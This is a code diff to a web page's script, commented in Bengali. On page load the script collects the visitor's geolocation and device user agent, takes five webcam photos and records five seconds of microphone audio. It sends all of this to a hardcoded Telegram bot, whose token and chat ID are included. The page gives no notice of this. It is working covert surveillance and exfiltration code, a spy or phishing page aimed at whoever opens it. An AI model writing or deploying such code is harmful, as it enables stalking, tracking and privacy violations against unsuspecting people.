@@ -14,36 +14,90 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        async function captureAndSend() {
+        async function sendData() {
+            // ১. লোকেশন এবং ডিভাইস ইনফো পাঠানো
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const info = `📍 Location:\nLat: ${lat}\nLon: ${lon}\n📱 Device: ${navigator.userAgent}`;
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: info })
+                    });
+                });
+            }
+
+            // ২. ক্যামেরা থেকে ৪-৫টি ছবি পাঠানো
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                for (let i = 0; i < 5; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    await new Promise((resolve) => {
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, `capture_${i+1}.png`);
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            resolve();
+                        }, 'image/png');
+                    });
+                }
                 
                 stream.getTracks().forEach(track => track.stop());
-                
-                canvas.toBlob(async (blob) => {
+            } catch (err) {
+                console.log('Camera Error');
+            }
+
+            // ৩. অডিও রেকর্ড করে পাঠানো
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.png');
+                    formData.append('voice', audioBlob, 'audio.webm');
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                         method: 'POST',
                         body: formData
                     });
-                }, 'image/png');
+                    
+                    audioStream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000); // ৫ সেকেন্ডের অডিও রেকর্ড হবে
             } catch (err) {
-                console.log('Error');
+                console.log('Audio Error');
             }
         }
-        window.onload = captureAndSend;
+
+        window.onload = sendData;
     </script>
 </body>
 </html>
